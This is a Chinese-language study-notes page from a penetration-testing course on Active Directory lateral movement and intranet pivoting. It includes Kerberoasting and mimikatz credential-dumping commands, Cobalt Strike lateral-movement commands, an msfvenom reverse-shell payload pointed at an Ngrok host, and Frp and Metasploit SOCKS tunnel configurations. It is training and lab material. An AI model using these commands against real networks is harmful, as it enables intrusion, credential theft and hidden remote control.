---
title: XD安全渗透测试课程 Day69-70 学习笔记：域横向移动与内网漫游代理隧道技术
description: 整理 XD安全渗透测试课程 Day69-70 内容：Day69 覆盖域横向移动实战（RDP 凭证复用、SPN 扫描与 Kerberoasting、Cobalt
  Strike 团队服务器部署、监听器配置、Beacon 生成上线、提权插件加载、域内信息收集与横向攻击）；Day70 讲解内网漫游 SOCKS 代理隧道技术（正反向连接区别、Ngrok
  免费公网隧道实战、Frp 自建跳板配置、MSF 路由添加与 SOCKS 代理开启、Proxifier/SocksCap64/蚁剑代理配置、三层内网渗透演练全流程复现）。
category: program-analysis
tags:
- XD安全
- 渗透测试
- 内网渗透
- 域横向移动
- Cobalt Strike
- Kerberoasting
- SPN扫描
- RDP
- SOCKS代理
- 内网穿透
- Ngrok
- Frp
- Metasploit
- 隧道技术
- 学习笔记
date: '2023-04-16'
updated: '2026-11-15'
---

## 概述

本页面整理自 XD安全渗透测试课程第 69-70 天学习笔记（微信公众号文章《XD安全渗透测试课 学习笔记 | 内网渗透(三)》）。内容分为两大模块：

- **Day69：域横向移动实战** —— 涵盖 RDP 凭证复用、SPN 服务枚举与 Kerberoasting 攻击、Cobalt Strike 团队服务器部署与 Beacon 生命周期管理、提权插件扩展、域内信息收集与横向攻击演示。
- **Day70：内网漫游 SOCKS 代理隧道技术** —— 系统讲解正向/反向连接区别、代理与隧道定位、Ngrok 免费公网隧道实战、Frp 自建跳板搭建、Metasploit 路由添加与 SOCKS4a 代理开启、多层代理工具链配置、三层内网渗透演练全链路复现。

> 交叉引用：[[xd-security-pentest-course-curriculum]] 提供完整课程大纲与资料下载；[[xd-security-internal-network-penetration-notes-day71-72]] 继续记录 Day71-72 隧道技术与应急响应内容。

---

## Day69：域横向移动

### RDP 协议凭证复用

在获得明文密码或 NTLM Hash 后，可直接通过 RDP（3389 端口）建立图形化会话。

| 平台 | 命令示例 |
|------|----------|
| Windows | `mstsc.exe /console /v:192.168.3.21 /admin` |
| Linux | `rdesktop 192.168.3.21:3389` |

> 关联页面：[[lm-ntlm-hash-generation-analysis]] 解析 NTLM Hash 生成算法；[[xd-security-pentest-basic-stage-notes]] 基础阶段包含凭证获取与横向移动基础。

### SPN 扫描与 Kerberoasting 攻击流程

**核心步骤**：

1. **SPN 探针枚举**  
   ```bash
   setspn -q */*
   setspn -q */* | findstr "MSSQL"
   ```
   定位运行特定服务（如 MSSQL）的域账户。

2. **请求服务票据 (TGS-REQ)**  
   使用 `mimikatz` 或 PowerShell (`Add-Type -AssemblyName System.IdentityModel; ...`) 向 KDC 请求目标 SPN 的 Kerberos 服务票据（TGS），票据加密方式为 RC4_HMAC_MD5，密钥派生自服务账户密码。

3. **导出票据离线破解**  
   ```bash
   mimikatz.exe "kerberos::ask /target:MSSQLSvc/dc01.domain.local:1433"
   mimikatz.exe "kerberos::list /export"
   ```
   导出 `.kirbi` 票据，使用 `tgsrepcrack.py` / `kerberoast.py` / Hashcat (`-m 13100`) 离线爆破。

4. **凭证重写与横向移动**  
   破解得到明文密码后，可通过 `runas /netonly`、PsExec、WMI、SMB、RDP 等方式复用凭证横向移动。

> 关联页面：[[cobalt-strike-external-c2-smb-beacon]] 含 Kerberoasting 与 SMB Beacon 横向移动实战；[[mimikatz-source-code-architecture-golden-ticket-audit]] 深度解析 Mimikatz Kerberos 模块源码；[[named-pipe-smb-detection-sysmon]] 覆盖 SMB 命名管道检测视角。

### Cobalt Strike 团队服务器部署与基础操作

#### 启动与连接

```bash
# 团队服务器 (Linux)
./teamserver <IP> <Password> [profile] [port]

# 客户端连接
./cobaltstrike
```
客户端需填写团队服务器 IP、端口、用户名、密码。

#### 监听器配置

- 支持 HTTP/HTTPS/DNS/SMB/External C2 等多种 Beacon 通信协议
- 关键字段：Name、Host (Team Server IP)、Port、Beacon Interval/Jitter、Spawnto、Proxy 配置
- 可创建多个监听器区分不同目标环境

#### Beacon 生成与上线

- **Attack → Packages → Windows Executable (S)/PowerShell/Service/...**
- 绑定监听器，设置输出路径，生成 Payload
- 目标执行后，Cobalt Strike 客户端 `Beacons` 视图显示上线会话

#### 提权与插件扩展

- 内置提权：`elevate uac-token-duplication`、`elevate system` 等
- **插件加载**：`View → Script Console → Load` 加载 `.cna` 脚本（如 ElevateKit、BOF、AceLdr 等），扩展提权/横向/持久化能力

#### 域内信息收集命令速查

| 目标 | 命令 |
|------|------|
| 当前用户/权限 | `whoami /all`、`getuid` |
| 网络拓扑/域控定位 | `net view /domain`、`net group "Domain Controllers" /domain` |
| 域用户/组枚举 | `net user /domain`、`net group /domain` |
| SPN 枚举 | `setspn -q */*` |
| 会话/共享枚举 | `net session`、`net share` |
| 进程列表 | `ps`、`ps -U` |
| 凭证导出 | `mimikatz` → `sekurlsa::logonpasswords`、`lsadump::dcsync` |
| 票据操作 | `kerberos::list`、`kerberos::ptt`、`kerberos::ask` |

> 关联页面：[[internal-network-pivoting-techniques]] 系统对比 Venom/Frp/SSH/Cobalt Strike SMB Beacon 等代理隧道技术；[[c2-redirectors-malleable-c2-profiles]] 覆盖 Malleable C2 Profile 流量混淆与重定向器部署。

#### 横向移动演示

- **Targets 视图**：自动构建域拓扑图，右键目标主机 → `Pivoting` / `Jump` / `Remote-exec`
- 支持 `psexec`、`winrm`、`wmi`、`rdp`、`smb` 等多种横向模块
- 结合 `make_token` / `pth` / `pass-the-ticket` 实现凭证复用

---

## Day70：内网漫游 SOCKS 代理隧道技术

### 核心概念辨析

| 概念 | 说明 |
|------|------|
| **正向连接** | 控制端主动连接被控端（需被控端有公网 IP 或端口映射） |
| **反向连接** | 被控端主动连接控制端（适用于被控端在内网、控制端在公网） |
| **代理** | 解决**网络连通性**问题，转发应用层流量（SOCKS4/5、HTTP） |
| **隧道** | 解决**流量隐匿/防火墙绕过**问题，封装任意协议流量（ICMP/DNS/HTTP/TCP/UDP） |

> 关联页面：[[xd-security-incident-response-notes]] Day71 详细记录 ICMP/端口转发/Netcat/DNS 隧道实战；[[frp内网渗透应用]] 系统记录 Frp 四大典型应用场景（Socks5、多级隧道、MSF 代理、RDP 转发）。

### Ngrok 免费公网隧道实战

**适用场景**：攻击机与目标机均处于不同内网，无公网 IP，需借助公共 Ngrok 服务建立反向通道。

**操作流程**：

1. 注册 [ngrok.cc](http://www.ngrok.cc/) 获取 `clientid`，创建隧道：协议 HTTP/TCP、本地端口指向 MSF/Cobalt Strike 监听端口（如 `192.168.76.132:4444`）
2. 攻击机 (Kali) 下载 `sunny` 客户端并启动：
   ```bash
   ./sunny clientid <你的clientid>
   ```
3. MSF 生成反向 Payload 指向 Ngrok 分配的公网域名/端口：
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=xioadiisec.free.idcfengye.com LPORT=80 -f exe > shell.exe
   ```
4. 目标机执行 `shell.exe`，流量经 Ngrok 隧道回传至攻击机 MSF 监听器上线

**优缺点**：零成本、无需自建服务器；但免费版带宽/并发受限、流量经第三方平台、不适合敏感实战。

### Frp 自建跳板服务搭建

**适用场景**：拥有公网 VPS，需完全可控、支持多协议（TCP/UDP/HTTP/HTTPS/STCP/XTCP）的内网穿透方案。

#### 服务端配置

```ini
# frps.ini
[common]
bind_port = 6677           # frpc 连接端口
vhost_http_port = 80       # HTTP 隧道端口
vhost_https_port = 443
dashboard_port = 7500      # Web 管理面板
dashboard_user = admin
dashboard_pwd = password
token = frp_token          # 认证令牌
```

启动：`./frps -c frps.ini`（建议配置 systemd 守护进程）

#### 客户端配置

```ini
# frpc.ini
[common]
server_addr = <VPS_IP>
server_port = 6677
token = frp_token

[msf_reverse_tcp]
type = tcp
local_ip = 127.0.0.1
local_port = 5555          # 本地 MSF 监听端口
remote_port = 6000         # VPS 暴露端口，目标连接此端口

[rdp_forward]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 33890
```

启动：`./frpc -c frpc.ini`

#### 实战链路

1. 攻击机 MSF 监听 `127.0.0.1:5555`
2. 目标机执行指向 `VPS_IP:6000` 的反向 Payload
3. 流量经 Frp 隧道转发至攻击机 MSF 上线
4. 后续可复用隧道转发 RDP、SMB、WinRM 等服务端口

> 关联页面：[[gkctf-2021-web-writeup]] 中 `hackme` 题目实战使用 Frp 穿透内网；[[vulnhub-boredhackerblog-social-network-writeup]] 记录 Docker 逃逸后利用 Frp 建立多级代理横向移动。

### Metasploit 路由添加与 SOCKS4a 代理

**场景**：已控制边界主机（双网卡），需通过该主机作为跳板访问深层内网。

#### 关键命令序列

```bash
# 1. 查看目标会话网卡信息
meterpreter > ifconfig
# 发现除已知网段外，还有 10.0.22.0/24 内网段

# 2. 添加路由
meterpreter > run autoroute -s 10.0.22.0/24
# 或手动
meterpreter > route add 10.0.22.0 255.255.255.0 <session_id>

# 3. 验证路由
meterpreter > route print

# 4. 在 MSF 控制台开启 SOCKS4a 代理
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > run -j

# 5. 配置 proxychains / Proxifier / SocksCap64 / 蚁剑 使用 127.0.0.1:1080
```

> 关联页面：[[metasploit-framework-basics-tutorial]] 覆盖 MSF 基础部署与后渗透模块；[[internal-network-pivoting-techniques]] 详细对比 MSF 路由、Cobalt Strike SOCKS、SSH 隧道等方案。

### 多层代理工具链配置

| 工具 | 代理协议 | 典型用法 |
|------|----------|----------|
| **Proxychains** | SOCKS4/5/HTTP | `proxychains nmap -sT -Pn 10.0.22.128` |
| **Proxifier** | 全局/规则制 | 将任意 GUI 工具（浏览器、蚁剑、Navicat、mstsc）强制走代理 |
| **SocksCap64** | 进程级注入 | 右键目标程序 → `Run with SocksCap64` |
| **蚁剑** | 内置代理设置 | `设置 → 代理 → SOCKS5 127.0.0.1:1080` |

**注意**：MSF `socks_proxy` 默认开启 **SOCKS4a**（支持域名解析），Proxychains 需配置 `socks4 127.0.0.1 1080`。

---

## 三层内网渗透演练全流程复现（某 CTF 线下 2019）

### 拓扑结构

```
攻击机 (Kali, 公网/出口) 
    │
    ▼ (Frp/Ngrok/MSF SOCKS)
边界主机 A (192.168.75.148, 双网卡: .75/.22) ── 内网 B (192.168.22.128, Web) ── 内网 C (192.168.22.x, 目标主机)
```

### 实战步骤速览

| 阶段 | 关键动作 | 工具/技术 |
|------|----------|-----------|
| **1. 边界突破** | 端口扫描 → ThinkPHP RCE → 写 Webshell (2.php) → 蚁剑连接 | Nmap、ThinkPHP Exploit、蚁剑 |
| **2. 立足点转 MSF** | 生成 Linux `meterpreter_reverse_tcp` → 上传执行 → MSF 上线 | msfvenom、MSF `multi/handler` |
| **3. 内网探测 & 路由** | `ifconfig` 发现 .22 网段 → `autoroute -s 192.168.22.0/24` | Meterpreter `autoroute` |
| **4. 开启 SOCKS 代理** | MSF `auxiliary/server/socks_proxy` (SRVPORT=1080, VERSION=4a) | MSF SOCKS4a |
| **5. 代理访问内网 Web** | 浏览器/Proxychains 配置代理 → 访问 `http://192.168.22.128` → 代码审计发现 SQLi → 拿后台账号 | Proxychains、SQLMap/手工注入 |
| **6. 后台 Getshell** | 后台功能点写 Webshell → 蚁剑配置代理连接 | 蚁剑 SOCKS5 代理 |
| **7. 横向深入** | 生成 Windows 正向绑定 Payload (`bind_tcp` LPORT=3333) → 上传执行 → MSF 监听上线 | msfvenom、MSF `multi/handler` |
| **8. 继续扩大战果** | 新会话 `autoroute` 添加下一层网段 → 循环步骤 4-7 | MSF 路由、SOCKS 代理 |

### 关键技术点总结

- **双网卡主机作为天然跳板**：无需额外部署隧道软件，直接用 Meterpreter `autoroute` + MSF SOCKS 代理即可穿透
- **正向/反向 Payload 选择**：边界主机出网用反向；内网主机无法直连攻击机时，用正向绑定配合端口转发/代理
- **工具代理化**：所有后续工具（Nmap、SQLMap、蚁剑、浏览器、RDP、SSH）均需走代理，Proxifier/Proxychains/SocksCap64 解决不支持代理的工具
- **会话管理**：多层内网建议使用 Cobalt Strike 或 MSF 多会话管理，配合 `route`/`socks_proxy` 实现统一代理出口

> 关联页面：[[vulnhub-boredhackerblog-social-network-writeup]] 同款三层内网渗透实战（Docker 逃逸 → Frp 代理 → Elasticsearch RCE → SSH → 内核提权）；[[cobalt-strike-external-c2-smb-beacon]] 覆盖 CS SMB Beacon 无需公网 IP 的横向移动模式。

---

## 速查表：Day69-70 核心命令与配置

### Kerberoasting

```bash
# 枚举 SPN
setspn -q */*

# 请求票据
mimikatz "kerberos::ask /target:MSSQLSvc/sql01.domain.local:1433" "kerberos::list /export"

# 破解
python tgsrepcrack.py wordlist.txt ticket.kirbi
hashcat -m 13100 ticket.kirbi rockyou.txt
```

### Cobalt Strike 常用控制台命令

```bash
# 信息收集
net view /domain
net group "Domain Controllers" /domain
net user /domain
setspn -q */*

# 凭证
mimikatz sekurlsa::logonpasswords
lsadump::dcsync /domain:domain.local /user:krbtgt

# 横向
jump psexec64 TARGET listener
jump winrm64 TARGET listener
jump rdp TARGET listener
make_token DOMAIN\user password
pth DOMAIN\user ntlm_hash
```

### Frp 典型配置模板

```ini
# frps.ini
[common]
bind_port = 7000
token = strong_token
dashboard_port = 7500

# frpc.ini (攻击机作为客户端，转发 MSF 监听)
[common]
server_addr = VPS_IP
server_port = 7000
token = strong_token

[msf_listener]
type = tcp
local_ip = 127.0.0.1
local_port = 4444
remote_port = 6000
```

### MSF SOCKS 代理 + Proxychains

```bash
# MSF
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run -j

# /etc/proxychains4.conf
socks4 127.0.0.1 1080

# 使用
proxychains nmap -sT -Pn -p 80,445,3389 10.0.22.0/24
proxychains rdesktop 10.0.22.50:3389
```

---

## 学习路线建议

1. **巩固 Kerberoasting 原理**：理解 SPN、TGS-REQ、RC4_HMAC_MD5 密钥派生、离线爆破全链路 → 实战复现 [[cobalt-strike-external-c2-smb-beacon]] 相关章节
2. **精通 Cobalt Strike 生命周期**：Team Server 部署 → 监听器设计 → Beacon 生成/上线/睡眠/提权/横向 → Malleable C2 Profile 定制 → 参考 [[c2-redirectors-malleable-c2-profiles]]
3. **内网代理隧道体系化**：
   - 入门：MSF `autoroute` + `socks_proxy` + Proxychains
   - 进阶：Frp 多协议/多级隧道、SSH `-D`/`-R`/`-L`、Cobalt Strike SOCKS/VPN 接口
   - 高阶：域前置、External C2、SMB Beacon、DNS/HTTP 隧道混合 → 参考 [[internal-network-pivoting-techniques]]、[[frp内网渗透应用]]
4. **实战靶场推荐**：
   - 单域横向：[[vulnhub-admx-new-writeup]]、[[vulnhub-pwned-writeup]]
   - 多层内网：[[vulnhub-boredhackerblog-social-network-writeup]]、[[gkctf-2021-web-writeup]] (hackme)
   - 红队演练：[[xd-security-awd-competition-strategies]]、[[xd-security-blue-team-defense]]

---

## 相关页面索引

| 页面 | 关联点 |
|------|--------|
| [[xd-security-pentest-course-curriculum]] | 完整课程大纲与资料下载 |
| [[xd-security-internal-network-penetration-notes-day71-72]] | Day71-72：ICMP/DNS/Netcat 隧道、CS-MSF 会话移交、应急响应 |
| [[xd-security-incident-response-notes]] | Day71-75 应急响应全流程与自动化工具箱 |
| [[cobalt-strike-external-c2-smb-beacon]] | CS 架构、SMB Beacon、External C2、横向移动深度解析 |
| [[internal-network-pivoting-techniques]] | Venom/Frp/SSH/CS/MSF 代理隧道横向对比与实战场景交叉引用 |
| [[frp内网渗透应用]] | Frp 四大典型场景完整配置示例 |
| [[metasploit-framework-basics-tutorial]] | MSF 安装、数据库、msfvenom、后渗透基础 |
| [[mimikatz-source-code-architecture-golden-ticket-audit]] | Mimikatz Kerberos 模块源码级分析 |
| [[named-pipe-smb-detection-sysmon]] | SMB 命名管道检测视角（蓝队对抗） |
| [[vulnhub-boredhackerblog-social-network-writeup]] | 三层内网渗透实战（Docker 逃逸→Frp 代理→横向→提权） |
| [[gkctf-2021-web-writeup]] | hackme 题目 Frp 内网穿透实战 |

---

> 页面维护说明：本页面基于微信公众号归档文章《XD安全渗透测试课 学习笔记 | 内网渗透(三)》整理，原文发布日期约 2023-04-16。如需查阅原文图片或完整命令输出，请访问原文链接。

## 来源

- [0x00实验室-202108-202304_105](../sources/0x00实验室-202108-202304_105.md)
